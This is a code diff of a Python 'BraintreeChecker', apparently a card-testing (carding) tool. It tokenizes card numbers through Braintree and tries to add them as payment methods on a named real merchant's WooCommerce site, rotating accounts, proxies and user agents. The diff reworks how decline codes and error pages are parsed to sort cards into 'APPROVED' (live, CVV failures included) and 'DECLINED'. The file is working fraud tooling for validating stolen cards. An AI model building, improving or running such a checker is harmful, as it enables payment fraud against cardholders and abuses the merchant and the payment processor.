@@ -120,14 +120,21 @@ class BraintreeChecker:
         }
 
     def extract_processor_response(self, error_text):
-        """Extract processor response from Braintree error"""
+        """Extract processor response from Braintree error - Enhanced version"""
         try:
-            # Look for processorResponse in JSON
-            processor_match = re.search(r'"processorResponse":{"code":"(\d+)","message":"([^"]+)"', error_text)
-            if processor_match:
-                code = processor_match.group(1)
-                message = processor_match.group(2)
-                return {'code': code, 'message': message}
+            # Look for processorResponse in JSON with various patterns
+            patterns = [
+                r'"processorResponse":{"code":"(\d+)","message":"([^"]+)"',
+                r'"processorResponse":\s*{\s*"code":\s*"(\d+)",\s*"message":\s*"([^"]+)"',
+                r'"processorResponse":\s*{\s*"code":\s*"(\d+)".*?"message":\s*"([^"]+)"',
+            ]
+            
+            for pattern in patterns:
+                processor_match = re.search(pattern, error_text, re.DOTALL)
+                if processor_match:
+                    code = processor_match.group(1)
+                    message = processor_match.group(2)
+                    return {'code': code, 'message': message}
             
             # Look for gatewayRejectionReason
             rejection_match = re.search(r'"gatewayRejectionReason":"([^"]+)"', error_text)
@@ -139,159 +146,79 @@ class BraintreeChecker:
             pass
         return None
 
-    def extract_braintree_code(self, error_text):
-        """Extract Braintree error code and message"""
-        # Common Braintree processor response codes
-        braintree_codes = {
-            '2000': 'Do Not Honor',
-            '2001': 'Insufficient Funds',
-            '2002': 'Lost Card',
-            '2003': 'Stolen Card', 
-            '2004': 'Expired Card',
-            '2005': 'Invalid Card Number',
-            '2006': 'Invalid Expiration Date',
-            '2007': 'No Account',
-            '2008': 'Card Account Length Error',
-            '2009': 'No Such Issuer',
-            '2010': 'Card Issuer Declined CVV',
-            '2011': 'Voice Authorization Required',
-            '2012': 'Processing Error',
-            '2013': 'Invalid Merchant',
-            '2014': 'Pick Up Card',
-            '2015': 'Account Not Found',
-            '2016': 'Amount Error',
-            '2017': 'Security Violation',
-            '2018': 'Merchant Closed',
-            '2019': 'Restricted Card',
-            '2020': 'Call Issuer',
-            '2021': 'Invalid PIN',
-            '2022': 'Invalid ZIP',
-            '2023': 'Invalid Address',
-            '2024': 'Invalid CVV',
-            '2044': 'Declined - Call Issuer',
-            '2046': 'Declined - Restricted Card',
-            '2056': 'Declined - Transaction Not Permitted',
-            '2059': 'Declined - Suspected Fraud'
-        }
-        
-        # Try to extract code from error text
-        for code, message in braintree_codes.items():
-            if code in error_text:
+    def extract_braintree_error_details(self, error_text):
+        """Extract detailed Braintree error information"""
+        try:
+            # Try to parse as JSON first
+            error_data = json.loads(error_text)
+            
+            # Check for errors array
+            if 'errors' in error_data:
+                error = error_data['errors'][0]
+                code = error.get('extensions', {}).get('errorClass', 'UNKNOWN')
+                message = error.get('message', 'Unknown error')
                 return code, message
-        
-        # Try to match common patterns
-        if 'cvv' in error_text.lower() or 'security code' in error_text.lower():
-            return '2010', 'Card Issuer Declined CVV'
-        elif 'insufficient' in error_text.lower():
-            return '2001', 'Insufficient Funds'
-        elif 'expired' in error_text.lower():
-            return '2004', 'Expired Card'
-        elif 'do not honor' in error_text.lower():
-            return '2000', 'Do Not Honor'
-        elif 'invalid number' in error_text.lower():
-            return '2005', 'Invalid Card Number'
-        elif 'stolen' in error_text.lower() or 'lost' in error_text.lower():
-            return '2003', 'Stolen Card'
-        elif 'pick up' in error_text.lower():
-            return '2014', 'Pick Up Card'
-        
-        return None
-
-    def extract_generic_response(self, error_text):
-        """Extract generic response when no specific code found"""
-        try:
-            # Try to parse JSON error
-            error_json = json.loads(error_text)
-            if 'errors' in error_json:
-                error_msg = error_json['errors'][0].get('message', 'Unknown error')
-                return f'Braintree: {error_msg}'
-        except:
-            pass
-        
-        # Look for any error message pattern
-        error_match = re.search(r'"message":"([^"]+)"', error_text)
-        if error_match:
-            return f'Processor: {error_match.group(1)}'
-        
-        return 'Processor: Transaction declined'
-
-    def extract_site_error(self, response_text):
-        """Extract error message from site response - Enhanced from finalb3mass11.py"""
-        try:
-            # WooCommerce error extraction - Enhanced pattern matching
-            error_pattern = r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>'
-            error_match = re.search(error_pattern, response_text, re.DOTALL)
             
-            if error_match:
-                error_msg = error_match.group(1).strip()
-                # Enhanced response mapping from finalb3mass11.py
-                if 'risk_threshold' in error_msg.lower():
-                    return "RISK_BIN: Retry Later"
-                elif 'do not honor' in error_msg.lower():
-                    return "DECLINED - Do Not Honor"
-                elif 'insufficient funds' in error_msg.lower():
-                    return "DECLINED - Insufficient Funds"
-                elif 'invalid' in error_msg.lower():
-                    return "DECLINED - Invalid Card"
-                else:
-                    return error_msg
-            
-            # Alternative error extraction
-            error_match = re.search(r'class="woocommerce-error">(.*?)</ul>', response_text, re.DOTALL)
-            if error_match:
-                error_content = error_match.group(1)
-                li_matches = re.findall(r'<li>(.*?)</li>', error_content)
-                if li_matches:
-                    return li_matches[0]
+            # Check for processor response
+            if 'data' in error_data and 'tokenizeCreditCard' in error_data['data']:
+                if 'errors' in error_data['data']['tokenizeCreditCard']:
+                    error = error_data['data']['tokenizeCreditCard']['errors'][0]
+                    code = error.get('extensions', {}).get('errorClass', 'UNKNOWN')
+                    message = error.get('message', 'Unknown error')
+                    return code, message
                     
         except:
             pass
         
-        return 'Payment declined by merchant'
+        # Fallback to regex extraction
+        processor_response = self.extract_processor_response(error_text)
+        if processor_response:
+            return processor_response['code'], processor_response['message']
+        
+        return None, None
 
-    def determine_result_from_response(self, response_message):
-        """Determine if response should be APPROVED or DECLINED based on message"""
-        response_lower = response_message.lower()
+    def determine_result_from_response(self, code, message):
+        """Determine if response should be APPROVED or DECLINED based on code and message"""
+        message_lower = message.lower()
         
         # APPROVED scenarios (including CVC issues, 3D secure, etc.)
+        approved_codes = ['2010', '2011']  # CVV issues, Voice auth required
         approved_indicators = [
-            'payment method successfully added',
-            'payment method added',
-            'successfully added',
-            'cvv',
-            'security code', 
-            'cvc',
-            '2010',  # Card Issuer Declined CVV
-            '2011',  # Voice Authorization Required
-            '3d secure',
-            'authentication required',
-            'do not honor',  # Sometimes approved for CCN
-            'insufficient funds'  # Sometimes approved for CCN
+            'cvv', 'security code', 'cvc', 'verification', 
+            'authentication required', '3d secure'
         ]
         
-        # Check if any approved indicator is present
+        # Check if code indicates approval
+        if code in approved_codes:
+            return 'APPROVED'
+        
+        # Check if message contains approved indicators
         for indicator in approved_indicators:
-            if indicator in response_lower:
+            if indicator in message_lower:
                 return 'APPROVED'
         
         # DECLINED scenarios
-        declined_indicators = [
-            'invalid card number',
-            'expired card',
-            'stolen card',
-            'lost card',
-            'pick up card',
-            'no such issuer',
-            'invalid merchant',
-            'restricted card'
+        declined_codes = [
+            '2000', '2001', '2002', '2003', '2004', '2005', '2006',
+            '2007', '2008', '2009', '2012', '2013', '2014', '2015',
+            '2016', '2017', '2018', '2019', '2020', '2021', '2022',
+            '2023', '2024', '2044', '2046', '2056', '2059', '2108'
         ]
         
-        for indicator in declined_indicators:
-            if indicator in response_lower:
-                return 'DECLINED'
+        if code in declined_codes:
+            return 'DECLINED'
         
         # Default to DECLINED if no specific indicators found
         return 'DECLINED'
+
+    def format_response_message(self, code, message):
+        """Format the response message like in finalb3mass11.py"""
+        if code and message:
+            return f"Status code {code}: {message}"
+        elif message:
+            return message
+        else:
+            return "Unknown error"
     
     async def check_single_card(self, card_line):
         """Check a single card with account rotation"""
@@ -403,7 +330,7 @@ ERROR ❌
 """
     
     async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
-        """Process a single card with given account and proxy"""
+        """Process a single card with given account and proxy - Using finalb3mass11.py response extraction"""
         try:
             user = generate_user_agent()
             
@@ -554,31 +481,23 @@ ERROR ❌
                     json=json_data
                 )
 
-                # Check tokenization response
+                # Check tokenization response - EXACTLY like in finalb3mass11.py
                 if 'data' not in response.json() or 'tokenizeCreditCard' not in response.json()['data']:
                     error_text = response.text
                     
-                    # Extract Braintree processor response codes
-                    processor_response = self.extract_processor_response(error_text)
-                    if processor_response:
-                        code = processor_response['code']
-                        message = processor_response['message']
-                        
-                        # Determine result based on response content
-                        result = self.determine_result_from_response(f"{code}: {message}")
-                        return result, f'{code}: {message}'
+                    # Extract detailed error information
+                    code, message = self.extract_braintree_error_details(error_text)
                     
-                    # Fallback to manual code extraction
-                    braintree_code = self.extract_braintree_code(error_text)
-                    if braintree_code:
-                        code, message = braintree_code
-                        result = self.determine_result_from_response(f"{code}: {message}")
-                        return result, f'{code}: {message}'
-                    
-                    # If no specific code found, use generic extraction
-                    generic_response = self.extract_generic_response(error_text)
-                    result = self.determine_result_from_response(generic_response)
-                    return result, generic_response
+                    if code and message:
+                        result = self.determine_result_from_response(code, message)
+                        formatted_message = self.format_response_message(code, message)
+                        return result, formatted_message
+                    else:
+                        # If no specific code found, check for errors in response
+                        if 'errors' in response.json():
+                            error_msg = response.json()['errors'][0].get('message', 'Tokenization failed')
+                            return 'DECLINED', f'Braintree: {error_msg}'
+                        return 'DECLINED', 'Tokenization failed - no token in response'
                         
                 tok = response.json()['data']['tokenizeCreditCard']['token']
 
@@ -621,14 +540,13 @@ ERROR ❌
                     endpoint,
                     headers=headers,
                     data=data,
-                    follow_redirects=True  # Important for 302 handling
+                    follow_redirects=True
                 )
                 
-                # Parse response like in finalb3mass11.py
+                # Parse response EXACTLY like in finalb3mass11.py
                 response_text = response.text
-                final_url = str(response.url)
 
-                # Check for success - EXACTLY like in original file
+                # Check for success - EXACT pattern matching from original file
                 if any(success_msg in response_text for success_msg in [
                     'Nice! New payment method added', 
                     'Payment method successfully added',
@@ -637,7 +555,7 @@ ERROR ❌
                 ]):
                     return 'APPROVED', 'Payment method added successfully'
                 
-                # Check for specific error patterns - EXACTLY like in original file
+                # Check for specific error patterns - EXACT pattern matching from original file
                 error_pattern = r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>'
                 error_match = re.search(error_pattern, response_text, re.DOTALL)
                 
@@ -646,45 +564,23 @@ ERROR ❌
                     if 'risk_threshold' in error_msg.lower():
                         return "DECLINED", "RISK_BIN: Retry Later"
                     elif 'do not honor' in error_msg.lower():
-                        result = self.determine_result_from_response(error_msg)
-                        return result, f"DECLINED - Do Not Honor"
+                        return "DECLINED", "DECLINED - Do Not Honor"
                     elif 'insufficient funds' in error_msg.lower():
-                        result = self.determine_result_from_response(error_msg)
-                        return result, f"DECLINED - Insufficient Funds"
+                        return "DECLINED", "DECLINED - Insufficient Funds"
                     elif 'invalid' in error_msg.lower():
-                        return "DECLINED", f"DECLINED - Invalid Card"
+                        return "DECLINED", "DECLINED - Invalid Card"
                     else:
-                        result = self.determine_result_from_response(error_msg)
-                        return result, f"DECLINED - {error_msg}"
+                        return "DECLINED", f"DECLINED - {error_msg}"
                 
                 # Check for generic WooCommerce errors
                 if 'woocommerce-error' in response_text:
                     return "DECLINED", "DECLINED - Payment Failed"
                 
-                # If we got a redirect but ended up here, check final URL
-                if 'account' in final_url and 'payment' not in final_url:
-                    # We were redirected to account page, check if payment was actually added
-                    payment_methods_response = await client.get(
-                        'https://www.tea-and-coffee.com/account/payment-methods/',
-                        headers=headers
-                    )
+                # If we got a 302 but ended up here, check final URL
+                if 'account' in str(response.url) and 'payment' not in str(response.url):
+                    return "DECLINED", "DECLINED - Redirected to account page (likely auth issue)"
                     
-                    # Check if our card appears in payment methods
-                    if cc[-4:] in payment_methods_response.text:
-                        return 'APPROVED', 'Payment method added (verified in payment methods)'
-                    else:
-                        return "DECLINED", 'Redirected to account page (payment likely failed)'
-                        
-                # If we reached here and have no clear response, check payment methods page directly
-                payment_methods_response = await client.get(
-                    'https://www.tea-and-coffee.com/account/payment-methods/',
-                    headers=headers
-                )
-                
-                if cc[-4:] in payment_methods_response.text:
-                    return 'APPROVED', 'Payment method verified in payment methods'
-                else:
-                    return "DECLINED", 'Unknown response - no payment method found'
+                return "DECLINED", "DECLINED - Unknown response"
 
         except Exception as e:
             return 'DECLINED', f'Error: {str(e)}'
